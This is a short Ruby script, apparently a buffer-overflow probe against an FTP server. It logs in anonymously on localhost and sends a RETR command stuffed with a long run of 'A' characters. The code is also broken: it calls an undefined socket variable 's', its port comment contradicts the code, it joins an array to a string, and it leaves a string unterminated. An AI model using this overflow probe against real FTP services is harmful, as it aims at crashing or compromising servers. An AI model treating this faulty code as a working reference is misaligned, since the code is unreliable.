require 'socket'        # Sockets are in standard library

hostname = 'localhost'
port = 2000

client = TCPSocket.open(hostname, port)   # Client, connects to server on port 9911

buff = ["A"]
counter = 1000
buff << "A" * counter

s.recv(1024)
s.send("USER anonymous\r\n",0)
s.recv(1024)
s.send("PASS billy@billy.com\r\n",0)
s.recv(1024)
s.send("RETR " + buff,0)
s.recv(1024)
s.send("QUIT\r\n,0)
s.close
